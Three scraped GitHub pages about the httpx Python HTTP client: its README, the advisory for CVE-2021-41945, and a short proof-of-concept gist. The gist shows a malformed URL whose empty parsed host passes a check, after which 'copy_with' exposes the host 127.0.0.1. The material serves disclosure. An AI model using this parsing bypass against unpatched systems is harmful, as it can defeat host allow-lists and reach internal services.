=== Content from github.com_f046385d_20250114_181220.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fencode%2Fhttpx)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fencode%2Fhttpx)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=encode%2Fhttpx)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[encode](/encode)
/
**[httpx](/encode/httpx)**
Public

* [Notifications](/login?return_to=%2Fencode%2Fhttpx) You must be signed in to change notification settings
* [Fork
  856](/login?return_to=%2Fencode%2Fhttpx)
* [Star
   13.6k](/login?return_to=%2Fencode%2Fhttpx)

A next generation HTTP client for Python. 🦋

[www.python-httpx.org/](https://www.python-httpx.org/ "https://www.python-httpx.org/")

### License

[BSD-3-Clause license](/encode/httpx/blob/master/LICENSE.md)

[13.6k
stars](/encode/httpx/stargazers) [856
forks](/encode/httpx/forks) [Branches](/encode/httpx/branches) [Tags](/encode/httpx/tags) [Activity](/encode/httpx/activity)
 [Star](/login?return_to=%2Fencode%2Fhttpx)

 [Notifications](/login?return_to=%2Fencode%2Fhttpx) You must be signed in to change notification settings

* [Code](/encode/httpx)
* [Issues
  43](/encode/httpx/issues)
* [Pull requests
  33](/encode/httpx/pulls)
* [Discussions](/encode/httpx/discussions)
* [Actions](/encode/httpx/actions)
* [Security](/encode/httpx/security)
* [Insights](/encode/httpx/pulse)

Additional navigation options

* [Code](/encode/httpx)
* [Issues](/encode/httpx/issues)
* [Pull requests](/encode/httpx/pulls)
* [Discussions](/encode/httpx/discussions)
* [Actions](/encode/httpx/actions)
* [Security](/encode/httpx/security)
* [Insights](/encode/httpx/pulse)

# encode/httpx

    master[Branches](/encode/httpx/branches)[Tags](/encode/httpx/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[1,500 Commits](/encode/httpx/commits/master/) | | |
| [.github](/encode/httpx/tree/master/.github ".github") | | [.github](/encode/httpx/tree/master/.github ".github") |  |  |
| [docs](/encode/httpx/tree/master/docs "docs") | | [docs](/encode/httpx/tree/master/docs "docs") |  |  |
| [httpx](/encode/httpx/tree/master/httpx "httpx") | | [httpx](/encode/httpx/tree/master/httpx "httpx") |  |  |
| [scripts](/encode/httpx/tree/master/scripts "scripts") | | [scripts](/encode/httpx/tree/master/scripts "scripts") |  |  |
| [tests](/encode/httpx/tree/master/tests "tests") | | [tests](/encode/httpx/tree/master/tests "tests") |  |  |
| [.gitignore](/encode/httpx/blob/master/.gitignore ".gitignore") | | [.gitignore](/encode/httpx/blob/master/.gitignore ".gitignore") |  |  |
| [CHANGELOG.md](/encode/httpx/blob/master/CHANGELOG.md "CHANGELOG.md") | | [CHANGELOG.md](/encode/httpx/blob/master/CHANGELOG.md "CHANGELOG.md") |  |  |
| [LICENSE.md](/encode/httpx/blob/master/LICENSE.md "LICENSE.md") | | [LICENSE.md](/encode/httpx/blob/master/LICENSE.md "LICENSE.md") |  |  |
| [README.md](/encode/httpx/blob/master/README.md "README.md") | | [README.md](/encode/httpx/blob/master/README.md "README.md") |  |  |
| [mkdocs.yml](/encode/httpx/blob/master/mkdocs.yml "mkdocs.yml") | | [mkdocs.yml](/encode/httpx/blob/master/mkdocs.yml "mkdocs.yml") |  |  |
| [pyproject.toml](/encode/httpx/blob/master/pyproject.toml "pyproject.toml") | | [pyproject.toml](/encode/httpx/blob/master/pyproject.toml "pyproject.toml") |  |  |
| [requirements.txt](/encode/httpx/blob/master/requirements.txt "requirements.txt") | | [requirements.txt](/encode/httpx/blob/master/requirements.txt "requirements.txt") |  |  |
| View all files | | |

## Repository files navigation

* README
* Code of conduct
* BSD-3-Clause license
* Security

[![HTTPX](https://raw.githubusercontent.com/encode/httpx/master/docs/img/butterfly.png)](https://www.python-httpx.org/)

**HTTPX** *- A next-generation HTTP client for Python.*

[![Test Suite](https://github.com/encode/httpx/workflows/Test%20Suite/badge.svg)](https://github.com/encode/httpx/actions)
[![Package version](https://camo.githubusercontent.com/fe2d49bd4a7e558b1677fe32d5587d5e48ed82888be472d776b89bd330256f63/68747470733a2f2f62616467652e667572792e696f2f70792f68747470782e737667)](https://pypi.org/project/httpx/)

HTTPX is a fully featured HTTP client library for Python 3. It includes **an integrated command line client**, has support for both **HTTP/1.1 and HTTP/2**, and provides both **sync and async APIs**.

---

Install HTTPX using pip:

```
$ pip install httpx
```

Now, let's get started:

```
>>> import httpx
>>> r = httpx.get('https://www.example.org/')
>>> r
<Response [200 OK]>
>>> r.status_code
200
>>> r.headers['content-type']
'text/html; charset=UTF-8'
>>> r.text
'<!doctype html>\n<html>\n<head>\n<title>Example Domain</title>...'
```

Or, using the command-line client.

```
$ pip install 'httpx[cli]'  # The command line client is an optional dependency.
```

Which now allows us to use HTTPX directly from the command-line...

[![httpx --help](/encode/httpx/raw/master/docs/img/httpx-help.png)](/encode/httpx/blob/master/docs/img/httpx-help.png)

Sending a request...

[![httpx http://httpbin.org/json](/encode/httpx/raw/master/docs/img/httpx-request.png)](/encode/httpx/blob/master/docs/img/httpx-request.png)

## Features

HTTPX builds on the well-established usability of `requests`, and gives you:

* A broadly [requests-compatible API](https://www.python-httpx.org/compatibility/).
* An integrated command-line client.
* HTTP/1.1 [and HTTP/2 support](https://www.python-httpx.org/http2/).
* Standard synchronous interface, but with [async support if you need it](https://www.python-httpx.org/async/).
* Ability to make requests directly to [WSGI applications](https://www.python-httpx.org/advanced/transports/#wsgi-transport) or [ASGI applications](https://www.python-httpx.org/advanced/transports/#asgi-transport).
* Strict timeouts everywhere.
* Fully type annotated.
* 100% test coverage.

Plus all the standard features of `requests`...

* International Domains and URLs
* Keep-Alive & Connection Pooling
* Sessions with Cookie Persistence
* Browser-style SSL Verification
* Basic/Digest Authentication
* Elegant Key/Value Cookies
* Automatic Decompression
* Automatic Content Decoding
* Unicode Response Bodies
* Multipart File Uploads
* HTTP(S) Proxy Support
* Connection Timeouts
* Streaming Downloads
* .netrc Support
* Chunked Requests

## Installation

Install with pip:

```
$ pip install httpx
```

Or, to include the optional HTTP/2 support, use:

```
$ pip install httpx[http2]
```

HTTPX requires Python 3.8+.

## Documentation

Project documentation is available at <https://www.python-httpx.org/>.

For a run-through of all the basics, head over to the [QuickStart](https://www.python-httpx.org/quickstart/).

For more advanced topics, see the [Advanced Usage](https://www.python-httpx.org/advanced/) section, the [async support](https://www.python-httpx.org/async/) section, or the [HTTP/2](https://www.python-httpx.org/http2/) section.

The [Developer Interface](https://www.python-httpx.org/api/) provides a comprehensive API reference.

To find out about tools that integrate with HTTPX, see [Third Party Packages](https://www.python-httpx.org/third_party_packages/).

## Contribute

If you want to contribute with HTTPX check out the [Contributing Guide](https://www.python-httpx.org/contributing/) to learn how to start.

## Dependencies

The HTTPX project relies on these excellent libraries:

* `httpcore` - The underlying transport implementation for `httpx`.
  + `h11` - HTTP/1.1 support.
* `certifi` - SSL certificates.
* `idna` - Internationalized domain name support.
* `sniffio` - Async library autodetection.

As well as these optional installs:

* `h2` - HTTP/2 support. *(Optional, with `httpx[http2]`)*
* `socksio` - SOCKS proxy support. *(Optional, with `httpx[socks]`)*
* `rich` - Rich terminal support. *(Optional, with `httpx[cli]`)*
* `click` - Command line client support. *(Optional, with `httpx[cli]`)*
* `brotli` or `brotlicffi` - Decoding for "brotli" compressed responses. *(Optional, with `httpx[brotli]`)*
* `zstandard` - Decoding for "zstd" compressed responses. *(Optional, with `httpx[zstd]`)*

A huge amount of credit is due to `requests` for the API layout that
much of this work follows, as well as to `urllib3` for plenty of design
inspiration around the lower-level networking details.

---

*HTTPX is [BSD licensed](https://github.com/encode/httpx/blob/master/LICENSE.md) code.
Designed & crafted with care.*
— 🦋 —

## About

A next generation HTTP client for Python. 🦋

[www.python-httpx.org/](https://www.python-httpx.org/ "https://www.python-httpx.org/")

### Topics

[python](/topics/python "Topic: python")
[http](/topics/http "Topic: http")
[asyncio](/topics/asyncio "Topic: asyncio")
[trio](/topics/trio "Topic: trio")

### Resources

[Readme](#readme-ov-file)
### License

[BSD-3-Clause license](#BSD-3-Clause-1-ov-file)
### Code of conduct

[Code of conduct](#coc-ov-file)
### Security policy

[Security policy](#security-ov-file)

[Activity](/encode/httpx/activity)
[Custom properties](/encode/httpx/custom-properties)
### Stars

[**13.6k**
stars](/encode/httpx/stargazers)
### Watchers

[**115**
watching](/encode/httpx/watchers)
### Forks

[**856**
forks](/encode/httpx/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fencode%2Fhttpx&report=encode+%28user%29)

## [Releases 51](/encode/httpx/releases)

[Version 0.28.1
Latest

Dec 6, 2024](/encode/httpx/releases/tag/0.28.1)
[+ 50 releases](/encode/httpx/releases)

## Sponsor this project

 Sponsor

[Learn more about GitHub Sponsors](/sponsors)

## [Packages 0](/orgs/encode/packages?repo_name=httpx)

No packages published

## [Used by 348k](/encode/httpx/network/dependents)

[* ![@IsaqueZS93](https://avatars.githubusercontent.com/u/187143525?s=64&v=4)
* ![@run-llama](https://avatars.githubusercontent.com/u/130722866?s=64&v=4)
* ![@gustavofbs](https://avatars.githubusercontent.com/u/61592832?s=64&v=4)
* ![@NetDevAutomate](https://avatars.githubusercontent.com/u/10087646?s=64&v=4)
* ![@erik-megarad](https://avatars.githubusercontent.com/u/6236?s=64&v=4)
* ![@ahirkeval49](https://avatars.githubusercontent.com/u/163200341?s=64&v=4)
* ![@landerox](https://avatars.githubusercontent.com/u/93047937?s=64&v=4)
* ![@deacon-ralph](https://avatars.githubusercontent.com/u/90080949?s=64&v=4)

+ 347,526](/encode/httpx/network/dependents)

## [Contributors 230](/encode/httpx/graphs/contributors)

* [![@tomchristie](https://avatars.githubusercontent.com/u/647359?s=64&v=4)](https://github.com/tomchristie)
* [![@florimondmanca](https://avatars.githubusercontent.com/u/15911462?s=64&v=4)](https://github.com/florimondmanca)
* [![@dependabot[bot]](https://avatars.githubusercontent.com/in/29110?s=64&v=4)](https://github.com/apps/dependabot)
* [![@github-actions[bot]](https://avatars.githubusercontent.com/in/15368?s=64&v=4)](https://github.com/apps/github-actions)
* [![@karpetrosyan](https://avatars.githubusercontent.com/u/92274156?s=64&v=4)](https://github.com/karpetrosyan)
* [![@sethmlarson](https://avatars.githubusercontent.com/u/18519037?s=64&v=4)](https://github.com/sethmlarson)
* [![@Kludex](https://avatars.githubusercontent.com/u/7353520?s=64&v=4)](https://github.com/Kludex)
* [![@yeraydiazdiaz](https://avatars.githubusercontent.com/u/6739793?s=64&v=4)](https://github.com/yeraydiazdiaz)
* [![@cansarigol](https://avatars.githubusercontent.com/u/5008696?s=64&v=4)](https://github.com/cansarigol)
* [![@j178](https://avatars.githubusercontent.com/u/10510431?s=64&v=4)](https://github.com/j178)
* [![@adriangb](https://avatars.githubusercontent.com/u/1755071?s=64&v=4)](https://github.com/adriangb)
* [![@cdeler](https://avatars.githubusercontent.com/u/32924338?s=64&v=4)](https://github.com/cdeler)
* [![@jcugat](https://avatars.githubusercontent.com/u/488594?s=64&v=4)](https://github.com/jcugat)
* [![@T-256](https://avatars.githubusercontent.com/u/132141463?s=64&v=4)](https://github.com/T-256)

[+ 216 contributors](/encode/httpx/graphs/contributors)

## Languages

* [Python
  99.5%](/encode/httpx/search?l=python)
* [Shell
  0.5%](/encode/httpx/search?l=shell)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_5d501435_20250115_111925.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-h8pj-cxx2-jfg2)

**CVE-2021-41945**

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-h8pj-cxx2-jfg2)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fadvisories%2F%3Cid%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

1. [GitHub Advisory Database](/advisories)
2. [GitHub Reviewed](/advisories?query=type%3Areviewed)
3. [CVE-2021-41945](/advisories/GHSA-h8pj-cxx2-jfg2)

## Improper Input Validation in httpx

Critical severity

GitHub Reviewed

Published
Apr 29, 2022
to the GitHub Advisory Database
•
Updated Sep 23, 2024

[Vulnerability details](/advisories/GHSA-h8pj-cxx2-jfg2)
[Dependabot alerts
0](/advisories/GHSA-h8pj-cxx2-jfg2/dependabot)

## Package

pip

httpx
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 0.23.0

## Patched versions

0.23.0

## Description

Encode OSS httpx <=1.0.0.beta0 is affected by improper input validation in `httpx.URL`, `httpx.Client` and some functions using `httpx.URL.copy_with`.

### References

* <https://nvd.nist.gov/vuln/detail/CVE-2021-41945>
* [encode/httpx#2184](https://github.com/encode/httpx/issues/2184)
* <https://gist.github.com/lebr0nli/4edb76bbd3b5ff993cf44f2fbce5e571>
* [encode/httpx#1831](https://github.com/encode/httpx/discussions/1831)
* [encode/httpx#2185](https://github.com/encode/httpx/pull/2185)
* <https://github.com/encode/httpx>
* [GHSA-h8pj-cxx2-jfg2](https://github.com/advisories/GHSA-h8pj-cxx2-jfg2 "GHSA-h8pj-cxx2-jfg2")
* <https://github.com/encode/httpx/releases/tag/0.23.0>
* <https://github.com/pypa/advisory-database/tree/main/vulns/httpx/PYSEC-2022-183.yaml>
* [encode/httpx@e3c495a](https://github.com/encode/httpx/commit/e3c495a32c63d8aa7f1bcf3b7b27ee1a0ff428e1)
* [encode/httpx@e9b0c85](https://github.com/encode/httpx/commit/e9b0c85dd4f4e4469c57c4b38e5101fd12081b5c)
* <http://encode.com>

Published by the [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2021-41945)
Apr 28, 2022

Published to the GitHub Advisory Database
Apr 29, 2022

Reviewed
Apr 29, 2022

Last updated
Sep 23, 2024

### Severity

Critical

9.3

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v4 base metrics

##### Exploitability Metrics

Attack Vector
Network

Attack Complexity
Low

Attack Requirements
None

Privileges Required
None

User interaction
None
##### Vulnerable System Impact Metrics

Confidentiality
High

Integrity
High

Availability
None
##### Subsequent System Impact Metrics

Confidentiality
None

Integrity
None

Availability
None

Learn more about base metrics

# CVSS v4 base metrics

##### Exploitability Metrics

Attack Vector:
This metric reflects the context by which vulnerability exploitation is possible. This metric value (and consequently the resulting severity) will be larger the more remote (logically, and physically) an attacker can be in order to exploit the vulnerable system. The assumption is that the number of potential attackers for a vulnerability that could be exploited from across a network is larger than the number of potential attackers that could exploit a vulnerability requiring physical access to a device, and therefore warrants a greater severity.

Attack Complexity:
This metric captures measurable actions that must be taken by the attacker to actively evade or circumvent existing built-in security-enhancing conditions in order to obtain a working exploit. These are conditions whose primary purpose is to increase security and/or increase exploit engineering complexity. A vulnerability exploitable without a target-specific variable has a lower complexity than a vulnerability that would require non-trivial customization. This metric is meant to capture security mechanisms utilized by the vulnerable system.

Attack Requirements:
This metric captures the prerequisite deployment and execution conditions or variables of the vulnerable system that enable the attack. These differ from security-enhancing techniques/technologies (ref Attack Complexity) as the primary purpose of these conditions is not to explicitly mitigate attacks, but rather, emerge naturally as a consequence of the deployment and execution of the vulnerable system.

Privileges Required:
This metric describes the level of privileges an attacker must possess prior to successfully exploiting the vulnerability. The method by which the attacker obtains privileged credentials prior to the attack (e.g., free trial accounts), is outside the scope of this metric. Generally, self-service provisioned accounts do not constitute a privilege requirement if the attacker can grant themselves privileges as part of the attack.

User interaction:
This metric captures the requirement for a human user, other than the attacker, to participate in the successful compromise of the vulnerable system. This metric determines whether the vulnerability can be exploited solely at the will of the attacker, or whether a separate user (or user-initiated process) must participate in some manner.
##### Vulnerable System Impact Metrics

Confidentiality:
This metric measures the impact to the confidentiality of the information managed by the VULNERABLE SYSTEM due to a successfully exploited vulnerability. Confidentiality refers to limiting information access and disclosure to only authorized users, as well as preventing access by, or disclosure to, unauthorized ones.

Integrity:
This metric measures the impact to integrity of a successfully exploited vulnerability. Integrity refers to the trustworthiness and veracity of information. Integrity of the VULNERABLE SYSTEM is impacted when an attacker makes unauthorized modification of system data. Integrity is also impacted when a system user can repudiate critical actions taken in the context of the system (e.g. due to insufficient logging).

Availability:
This metric measures the impact to the availability of the VULNERABLE SYSTEM resulting from a successfully exploited vulnerability. While the Confidentiality and Integrity impact metrics apply to the loss of confidentiality or integrity of data (e.g., information, files) used by the system, this metric refers to the loss of availability of the impacted system itself, such as a networked service (e.g., web, database, email). Since availability refers to the accessibility of information resources, attacks that consume network bandwidth, processor cycles, or disk space all impact the availability of a system.
##### Subsequent System Impact Metrics

Confidentiality:
This metric measures the impact to the confidentiality of the information managed by the SUBSEQUENT SYSTEM due to a successfully exploited vulnerability. Confidentiality refers to limiting information access and disclosure to only authorized users, as well as preventing access by, or disclosure to, unauthorized ones.

Integrity:
This metric measures the impact to integrity of a successfully exploited vulnerability. Integrity refers to the trustworthiness and veracity of information. Integrity of the SUBSEQUENT SYSTEM is impacted when an attacker makes unauthorized modification of system data. Integrity is also impacted when a system user can repudiate critical actions taken in the context of the system (e.g. due to insufficient logging).

Availability:
This metric measures the impact to the availability of the SUBSEQUENT SYSTEM resulting from a successfully exploited vulnerability. While the Confidentiality and Integrity impact metrics apply to the loss of confidentiality or integrity of data (e.g., information, files) used by the system, this metric refers to the loss of availability of the impacted system itself, such as a networked service (e.g., web, database, email). Since availability refers to the accessibility of information resources, attacks that consume network bandwidth, processor cycles, or disk space all impact the availability of a system.

 CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N

### [EPSS score](https://www.first.org/epss/user-guide)

0.165%
 (54th percentile)

### Weaknesses

[CWE-20](/advisories?query=cwe%3A20)

### CVE ID

CVE-2021-41945

### GHSA ID

GHSA-h8pj-cxx2-jfg2

### Source code

[encode/httpx](https://github.com/encode/httpx)

### Credits

* [![@lebr0nli](https://avatars.githubusercontent.com/u/61896187?s=40&v=4)](/lebr0nli)
  [lebr0nli](/lebr0nli)
  Analyst
* [![@Bibo-Joshi](https://avatars.githubusercontent.com/u/22366557?s=40&v=4)](/Bibo-Joshi)
  [Bibo-Joshi](/Bibo-Joshi)
  Analyst
* [![@AngellusMortis](https://avatars.githubusercontent.com/u/490848?s=40&v=4)](/AngellusMortis)
  [AngellusMortis](/AngellusMortis)
  Analyst
* [![@marcoaaguiar](https://avatars.githubusercontent.com/u/7772685?s=40&v=4)](/marcoaaguiar)
  [marcoaaguiar](/marcoaaguiar)
  Analyst
* [![@br3ndonland](https://avatars.githubusercontent.com/u/26674818?s=40&v=4)](/br3ndonland)
  [br3ndonland](/br3ndonland)
  Analyst

 Loading

Checking history

See something to contribute?
[Suggest improvements for this vulnerability](/advisories/GHSA-h8pj-cxx2-jfg2/improve).

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from gist.github.com_3074b7fd_20250114_181219.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Flebr0nli%2F4edb76bbd3b5ff993cf44f2fbce5e571)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Flebr0nli%2F4edb76bbd3b5ff993cf44f2fbce5e571&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Flebr0nli%2F4edb76bbd3b5ff993cf44f2fbce5e571) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Flebr0nli%2F4edb76bbd3b5ff993cf44f2fbce5e571&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@lebr0nli](https://avatars.githubusercontent.com/u/61896187?s=64&v=4)](/lebr0nli)

# [lebr0nli](/lebr0nli)/**[poc.py](/lebr0nli/4edb76bbd3b5ff993cf44f2fbce5e571)** Secret

Last active
May 20, 2022 23:42

Show Gist options

* [Download ZIP](/lebr0nli/4edb76bbd3b5ff993cf44f2fbce5e571/archive/826148059bc662fdee61d82c1a0929b914762c82.zip)

* [Star
  (1)
  1](/login?return_to=https%3A%2F%2Fgist.github.com%2Flebr0nli%2F4edb76bbd3b5ff993cf44f2fbce5e571)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Flebr0nli%2F4edb76bbd3b5ff993cf44f2fbce5e571)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/lebr0nli/4edb76bbd3b5ff993cf44f2fbce5e571.js&quot;&gt;&lt;/script&gt;
* Save lebr0nli/4edb76bbd3b5ff993cf44f2fbce5e571 to your computer and use it in GitHub Desktop.

[Code](/lebr0nli/4edb76bbd3b5ff993cf44f2fbce5e571)
[Revisions
2](/lebr0nli/4edb76bbd3b5ff993cf44f2fbce5e571/revisions)
[Stars
1](/lebr0nli/4edb76bbd3b5ff993cf44f2fbce5e571/stargazers)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/lebr0nli/4edb76bbd3b5ff993cf44f2fbce5e571.js&quot;&gt;&lt;/script&gt;

Save lebr0nli/4edb76bbd3b5ff993cf44f2fbce5e571 to your computer and use it in GitHub Desktop.

[Download ZIP](/lebr0nli/4edb76bbd3b5ff993cf44f2fbce5e571/archive/826148059bc662fdee61d82c1a0929b914762c82.zip)

httpx PoC

 [Raw](/lebr0nli/4edb76bbd3b5ff993cf44f2fbce5e571/raw/826148059bc662fdee61d82c1a0929b914762c82/poc.py)

[**poc.py**](#file-poc-py)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | import httpx |
| --- | --- |
|  |  |
|  | url\_str = "http:////127.0.0.1:1337/to/path?q=a#test" |
|  |  |
|  | print("#### before calling 'copy\_with' ####") |
|  |  |
|  | url = httpx.URL(url\_str) |
|  |  |
|  | print("unsplit url:", url) |
|  |  |
|  | print("url.netloc:", url.netloc) |
|  |  |
|  | print("url.path:", url.path) # //127.0.0.1:1337/to/path |
|  |  |
|  | print("url.query:", url.query) # b'q=a' |
|  |  |
|  | assert b"127.0.0.1" not in url.netloc # security check for the PoC |
|  |  |
|  | print() |
|  |  |
|  | print("#### e.g. trying to use 'copy\_with' to remove fragment ####") |
|  |  |
|  | url = url.copy\_with(fragment=None) |
|  |  |
|  | print("unsplit url:", url) |
|  |  |
|  | print("url.netloc:", url.netloc) # b'127.0.0.1:1337' |
